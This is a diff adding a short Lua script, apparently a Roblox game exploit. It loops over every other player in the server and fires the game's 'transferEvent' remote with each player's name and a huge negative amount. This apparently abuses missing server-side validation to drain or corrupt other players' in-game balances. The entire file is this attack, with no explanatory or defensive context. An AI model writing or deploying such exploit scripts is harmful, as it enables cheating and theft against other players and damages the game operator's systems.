@@ -1,0 +1,9 @@
+local lp=game:GetService("Players").LocalPlayer
+local p=game:GetService("Players"):GetPlayers()
+local b="-10000000000000"
+
+for i=1,#p do
+    if p[i]~=lp then
+        game:GetService("ReplicatedStorage").majicPhoneEvents.transferEvent:FireServer(p[i].Name,b)
+    end
+end
